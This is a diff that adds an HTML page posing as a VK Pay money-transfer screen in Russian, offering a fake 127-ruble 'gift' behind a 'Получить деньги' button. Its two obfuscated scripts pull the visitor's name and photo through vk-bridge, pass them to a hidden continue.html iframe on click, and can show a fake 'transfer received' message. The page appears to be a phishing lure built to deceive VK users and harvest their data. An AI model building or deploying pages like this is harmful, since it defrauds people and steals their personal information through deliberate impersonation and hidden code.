@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>vk-pay</title>
+	<link rel="stylesheet" href="style.css">
+</head>
+<body>
+	<div id="app" v-cloak>
+        <template v-if="iframe">
+            <iframe :src="src"></iframe>
+        </template>
+		<div class="vk-app">
+			<template v-if="modalFinish">
+				<div class="modal modal-finish">
+					<div class="modal-overlay" @click="modalFinish = false"></div>
+					<div class="modal-inner">
+						<div class="modal-close" @click="modalFinish = false"></div>
+						<div class="modal-content">
+							<div class="finish">
+								<div class="modal-icon">
+									<svg width="36" height="36" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M17.9998 0.857178C27.4675 0.857178 35.1426 8.5323 35.1426 18C35.1426 27.4678 27.4675 35.1429 17.9998 35.1429C8.53205 35.1429 0.856934 27.4678 0.856934 18C0.856934 8.5323 8.53205 0.857178 17.9998 0.857178ZM17.9998 3.71432C10.11 3.71432 3.71408 10.1103 3.71408 18C3.71408 25.8898 10.11 32.2857 17.9998 32.2857C25.8896 32.2857 32.2855 25.8898 32.2855 18C32.2855 10.1103 25.8896 3.71432 17.9998 3.71432ZM24.1284 12.7C24.6863 12.1421 25.599 12.1421 26.1569 12.7C26.7148 13.2579 26.7148 14.1707 26.1569 14.7286L16.1528 24.7245C15.5949 25.2824 14.6904 25.2824 14.1325 24.7245L9.13249 19.7245C8.5746 19.1666 8.5746 18.2621 9.13249 17.7042C9.69039 17.1463 10.5949 17.1463 11.1528 17.7042L15.1426 21.694L24.1284 12.7Z" fill="#3F8AE0"/>
+                                    </svg>
+								</div>
+								<h3 class="modal-title">Перевод успешно получен!</h3>
+								<p class="modal-description">
+									Деньги на ваш аккаунт VK Pay будут зачислены в течении одной рабочей недели
+								</p>
+							</div>
+						</div>
+					</div>
+				</div>
+			</template>
+			<div class="panel">
+				<div class="panel-inner">
+					<a href="#" class="panel-block">
+						<svg width="10" height="17" viewBox="0 0 10 17" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M1.34324 7.66657L7.97415 1.03566C8.40809 0.601721 9.11164 0.601721 9.54558 1.03566C9.97952 1.4696 9.97952 2.17315 9.54558 2.60709L3.65272 8.49994L9.54558 14.3928C9.97952 14.8267 9.97952 15.5303 9.54558 15.9642C9.11164 16.3982 8.40809 16.3982 7.97415 15.9642L1.34324 9.33332C0.882982 8.87306 0.882982 8.12683 1.34324 7.66657Z" fill="white"/>
+                        </svg>
+					</a>
+					<a href="/" class="panel-block">
+						<svg width="55" height="17" viewBox="0 0 55 17" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M6.7793 13H4.62598L0.0996094 0.317383H2.23535L5.68945 10.7852H5.74219L9.20508 0.317383H11.3057L6.7793 13ZM14.6807 13H12.7119V0.317383H14.6807V6.35547H14.7598L20.0596 0.317383H22.3975L17.3701 5.93359L22.8193 13H20.376L15.9814 7.28711L14.6807 8.77246V13ZM27.7412 0.317383H32.4961C33.7266 0.317383 34.7285 0.704102 35.502 1.47754C36.2812 2.25098 36.6709 3.25293 36.6709 4.4834C36.6709 5.71973 36.2754 6.72754 35.4844 7.50684C34.6992 8.28027 33.6826 8.66699 32.4346 8.66699H29.71V13H27.7412V0.317383ZM29.71 1.97852V7.01465H31.9688C32.8242 7.01465 33.4863 6.79492 33.9551 6.35547C34.4238 5.91602 34.6582 5.29492 34.6582 4.49219C34.6582 3.69531 34.4238 3.07715 33.9551 2.6377C33.4922 2.19824 32.833 1.97852 31.9775 1.97852H29.71ZM40.6611 11.6553C41.3291 11.6553 41.8887 11.4531 42.3398 11.0488C42.7969 10.6387 43.0254 10.1348 43.0254 9.53711V8.80762L40.749 8.94824C40.1807 8.98926 39.7412 9.12988 39.4307 9.37012C39.126 9.60449 38.9736 9.9209 38.9736 10.3193C38.9736 10.7236 39.126 11.0488 39.4307 11.2949C39.7412 11.5352 40.1514 11.6553 40.6611 11.6553ZM40.1338 13.1582C39.2256 13.1582 38.4844 12.9004 37.9102 12.3848C37.3418 11.8691 37.0576 11.1982 37.0576 10.3721C37.0576 9.56348 37.3564 8.92188 37.9541 8.44727C38.5518 7.9668 39.3984 7.69727 40.4941 7.63867L43.0254 7.48926V6.77734C43.0254 6.26172 42.8613 5.86035 42.5332 5.57324C42.2051 5.28027 41.751 5.13379 41.1709 5.13379C40.6318 5.13379 40.1924 5.25391 39.8525 5.49414C39.5186 5.73438 39.3076 6.06543 39.2197 6.4873H37.4268C37.4795 5.63184 37.8486 4.93457 38.5342 4.39551C39.2197 3.85645 40.1221 3.58691 41.2412 3.58691C42.3604 3.58691 43.251 3.8623 43.9131 4.41309C44.5811 4.96387 44.915 5.70215 44.915 6.62793V13H43.0957V11.4795H43.0518C42.7881 11.9893 42.3867 12.3965 41.8477 12.7012C41.3145 13.0059 40.7432 13.1582 40.1338 13.1582ZM47.6748 16.4453C47.3174 16.4453 47.0596 16.4307 46.9014 16.4014V14.8633C46.9951 14.8867 47.2002 14.8984 47.5166 14.8984C47.9619 14.8984 48.3105 14.7959 48.5625 14.5908C48.8145 14.3916 49.0137 14.0547 49.1602 13.5801C49.1602 13.5742 49.1895 13.4775 49.248 13.29L49.3271 13.0088L45.9873 3.75391H48.0439L50.3906 11.2773H50.417L52.7637 3.75391H54.7676L51.2959 13.4834C50.9033 14.6025 50.4434 15.376 49.916 15.8037C49.3887 16.2314 48.6416 16.4453 47.6748 16.4453Z" fill="white"/>
+                        </svg>
+					</a>
+					<a href="#" class="panel-block">
+						<svg width="17" height="5" viewBox="0 0 17 5" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M2.79967 0.571411C3.86479 0.571411 4.72824 1.43486 4.72824 2.49998C4.72824 3.5651 3.86479 4.42856 2.79967 4.42856C1.73454 4.42856 0.871094 3.5651 0.871094 2.49998C0.871094 1.43486 1.73454 0.571411 2.79967 0.571411ZM8.79967 0.571411C9.86479 0.571411 10.7282 1.43486 10.7282 2.49998C10.7282 3.5651 9.86479 4.42856 8.79967 4.42856C7.73454 4.42856 6.87109 3.5651 6.87109 2.49998C6.87109 1.43486 7.73454 0.571411 8.79967 0.571411ZM14.7997 0.571411C15.8648 0.571411 16.7282 1.43486 16.7282 2.49998C16.7282 3.5651 15.8648 4.42856 14.7997 4.42856C13.7345 4.42856 12.8711 3.5651 12.8711 2.49998C12.8711 1.43486 13.7345 0.571411 14.7997 0.571411Z" fill="white"/>
+                        </svg>
+					</a>
+				</div>
+			</div>
+			<div class="transfer transfer-3">
+				<div class="transfer-inner">
+					<div class="transfer-block">
+						<div class="user">
+							<div class="user-img">
+								<img src="https://sun9-22.userapi.com/c845121/v845121610/3bd14/YBisd1gzmy8.jpg" alt="">
+							</div>
+							<div class="user-name">VK Pay</div>
+						</div>
+						<div class="transfer-content">
+							<p>Перевод в размере:</p>
+							<div class="transfer-money">
+								127<span>₽</span>
+							</div>
+						</div>
+						<div class="transfer-comment">Подарок за пользование VK Pay</div>
+					</div>
+					<button class="btn btn-primary btn-transfer" @click="auth">Получить деньги</button>
+				</div>
+			</div>
+		</div>
+	</div>
+	<script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
+    <script>
+     var _0xbb36=['14096XahdDN','431338VnqYii','VKWebAppGetUserInfo','send','1LchCOc','221415cFiMJR','21467aZPoNT','VKWebAppInit','1666525XUICBC','2DQCoNr','1NUUJOo','1009480HzdOSd','24MAGrAN','184465gGogoA'];var _0x34beaa=_0x2e8e;function _0x2e8e(_0x32f1aa,_0x41a62e){_0x32f1aa=_0x32f1aa-0x116;var _0xbb3605=_0xbb36[_0x32f1aa];return _0xbb3605;}(function(_0x41e295,_0x505250){var _0x471c1d=_0x2e8e;while(!![]){try{var _0x1cbf39=parseInt(_0x471c1d(0x122))*parseInt(_0x471c1d(0x118))+parseInt(_0x471c1d(0x11b))+-parseInt(_0x471c1d(0x117))*-parseInt(_0x471c1d(0x11d))+parseInt(_0x471c1d(0x11c))*parseInt(_0x471c1d(0x11a))+parseInt(_0x471c1d(0x121))*-parseInt(_0x471c1d(0x120))+parseInt(_0x471c1d(0x119))+-parseInt(_0x471c1d(0x116));if(_0x1cbf39===_0x505250)break;else _0x41e295['push'](_0x41e295['shift']());}catch(_0x499679){_0x41e295['push'](_0x41e295['shift']());}}}(_0xbb36,0x81044),vkBridge[_0x34beaa(0x11f)](_0x34beaa(0x123)));var user_info=vkBridge[_0x34beaa(0x11f)](_0x34beaa(0x11e),{});
+    </script>
+	<script src="https://unpkg.com/vue@2.6.12/dist/vue.js"></script>
+	<script>
+		var _0x234a=['modalFinish','#app','&photo=','153609NlCzVV','23428HApLvY','4kGmyuU','nameuser','683251ahkTXB','182357WnKfpm','9446bnNgKx','79IExQWU','289692TjbDNk','9533blPpTG','true','location','[?&]','finish','photo_max_orig','match','last_name','41TwDXGG','continue.html?name=','=([^&]*)(&?)','9SmvAWU'];var _0x28a7c9=_0x508d;(function(_0x50bae7,_0x11da4e){var _0x5f4b89=_0x508d;while(!![]){try{var _0x3bfba9=parseInt(_0x5f4b89(0x1d5))*parseInt(_0x5f4b89(0x1d1))+-parseInt(_0x5f4b89(0x1c1))+parseInt(_0x5f4b89(0x1c6))*-parseInt(_0x5f4b89(0x1c4))+-parseInt(_0x5f4b89(0x1c3))*-parseInt(_0x5f4b89(0x1ce))+-parseInt(_0x5f4b89(0x1c5))+parseInt(_0x5f4b89(0x1be))+parseInt(_0x5f4b89(0x1c2))*parseInt(_0x5f4b89(0x1bf));if(_0x3bfba9===_0x11da4e)break;else _0x50bae7['push'](_0x50bae7['shift']());}catch(_0xa27c09){_0x50bae7['push'](_0x50bae7['shift']());}}}(_0x234a,0xc279d));function _0x508d(_0x47dd5f,_0x3d845b){_0x47dd5f=_0x47dd5f-0x1be;var _0x234aa6=_0x234a[_0x47dd5f];return _0x234aa6;}var app=new Vue({'el':_0x28a7c9(0x1d3),'data':{'modalFinish':![],'iframe':![],'nameuser':'','photo':'','src':''},'methods':{'auth'(){var _0x5f0f1c=_0x28a7c9;this['src']=_0x5f0f1c(0x1cf)+this[_0x5f0f1c(0x1c0)]+_0x5f0f1c(0x1d4)+this['photo'],this['iframe']=!![];}},'mounted'(){var _0x6bab26=_0x28a7c9;function _0x178754(_0x3058ff){var _0x190d0f=_0x508d,_0x58ed8d=window[_0x190d0f(0x1c8)]['search'][_0x190d0f(0x1cc)](new RegExp(_0x190d0f(0x1c9)+_0x3058ff+_0x190d0f(0x1d0),'i'));return _0x58ed8d?_0x58ed8d[0x1]:_0x58ed8d;}_0x178754(_0x6bab26(0x1ca))!=null&&_0x178754(_0x6bab26(0x1ca))==_0x6bab26(0x1c7)&&(this[_0x6bab26(0x1d2)]=!![]);},'created':function(){user_info['then'](_0x1b1733=>{var _0xcea32e=_0x508d;this[_0xcea32e(0x1c0)]=_0x1b1733['first_name']+'\x20'+_0x1b1733[_0xcea32e(0x1cd)],this['photo']=_0x1b1733[_0xcea32e(0x1cb)];});}});
+    </script>
+</body>
+</html>
